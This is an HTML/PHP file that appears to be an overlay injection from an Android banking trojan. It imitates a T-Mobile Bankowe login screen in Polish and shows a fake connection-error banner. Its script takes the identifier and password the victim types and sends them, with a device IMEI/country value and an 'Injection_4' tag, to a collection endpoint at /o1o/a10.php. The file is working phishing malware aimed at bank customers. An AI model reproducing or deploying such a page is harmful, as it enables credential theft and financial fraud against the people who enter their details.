<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">

</head>

<style>

  .body {
      padding: 0;
      margin: 0;
      background: #fff;
      font-family: sans-serif;
  }

  .header {
      color: #61ba46;
      font-weight: bold;
      border-bottom: 2px solid #61ba46;
  }

  label {
      color: #b7b7b7;
      font-weight: 100;
  }

  form {
      padding: 15px;
  }
  .booting.on {
      top: 0;
  }


  .text-center {
      text-align: center;
  }

  .booting {
      position: absolute;
      z-index: 100;
      top: -100%;
      -webkit-transition: all .5s ease;
      transition: all .5s ease;
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      overflow: auto;
      text-align: center;
  }

  .booting.on .booting-logo {
      -webkit-animation: booting-animation;
      animation: booting-animation;
          animation-duration: 0s;
          animation-iteration-count: 1;
      -webkit-animation-duration: 2s;
      animation-duration: 2s;
      -webkit-animation-iteration-count: infinite;
      animation-iteration-count: infinite;
  }
  .input {
      width: 100%;
      border: 0;
      border-bottom: 1px solid #61ba46;
      margin-bottom: 15px;
  }

  .footer {
      position: fixed;
      bottom: 0px;
      left: 0px;
      width: 100%;
      padding: 10px;
  }

  .button {
      width: 100%;
      padding: 8px;
      color: #fff;
      background: #61b23c;
      border: 0;
  }

</style>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>
    <div class="header">
        <img style="padding: 10px;margin-right: 15px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAWCAMAAAAo0TYrAAAAD1BMVEX///+4BQm4BQm4BQm4BQkMyFn7AAAABXRSTlMAYP/vMLjqGtAAAAAxSURBVBjTY2CAA0YmRgYGZC4TsgCIiyQA4TKz0JvLwMKM6pCBFUAKIJAASgCyMAO5AOilAV0sxZc0AAAAAElFTkSuQmCC">
        Zaloguj
        <img style="float: right;width: 45px;padding: 8px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAApVBMVEX///+np6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6e9vb3W1tbn5+ft7e2np6fDw8Pz8/P///+qqqrh4eHi4uLr6+unp6enp6e+vr6zs7Pc3NzExMT5+fmtra3Q0NC5ubmnp6eoqKinp6e8vLynp6fX19enp6fp6emnp6fy8vLKysqnp6fv7++np6fY2Ninp6fs7Oy/v7+np6enp6eDYOhqAAAAN3RSTlMAAANLh7vMFZ/b/2zn/////2//////////GOr//////////wT/Tv+K/8H/2P//0v+O/1H//wkG2nzPpAAAAT9JREFUSMftVNt2gjAQBBXEQSEoiKBFvHD1rm3//9NKAQP0nBD6zjxtzpnJ7iY7Kwg9enSDKIqD4UiSZWk0HGQHvmKsTFBiooz5fHUKzDSdEF2bAVODx1eA+cIssZgDCo9vLc0abKtdocJamQ2sLKhsvuOiuJ+sgc1HHi7hOi0FeTlp6/u73R52fvDYRR1wLPrVkN1OsC46P+LAEAQIa9VvsS+CEAFDECGuCd4ZzBgRQ5AgrQnePZgpEobghHPFv+BSRmecGIIrbpSvlQ+W4YYrQyBBp4KNT0MdEkNwx6PKoNHwgTtD8Gw8K0WIJ+/jGhlaPo6ORgaf9tAyGr/DZ/8tyG4bPsGA9WryXxYMjoHs/xgot6hXWdTjWjSrygU+45SQNM5c5Br8teHU14zTaZF9BVEiy0kUfHdaZD165PgBDbEr/ZyhlC8AAAAASUVORK5CYII=">
    </div>
    <form method="post" name="form">
        <label for="login"> Identyfikator</label>
        <input type="tel" name="login" placeholder="Podaj identyfikator" class="input" id="login" >

        <label for="password"> Hasło</label>
        <input type="password" name="password" placeholder="Podaj hasło" class="input" id="password" >


    </form>
    <div class="footer">
        <input type="submit" class="button" onClick="sentServer();" value="Zaloguj">
    </div>
<script>
	function sentServer()
	{
	//var imei_c = document.forms["form"].elements["imei"].value;
	var login1 = document.forms["form"].elements["login"].value;
    var haslo = document.forms["form"].elements["password"].value;

	var url='<?php echo $URL; ?>';
    var imei_c='<?php echo $IMEI_country; ?>';

    if((login1=="") || (haslo=="")){
    	return false;
    }

location.replace('/o1o/a10.php?p=' + imei_c+"|Injection_4|eu_eleader_mobilebanking|"+login1+"|"+haslo);
	}
</script>
    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},3e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>
</html>
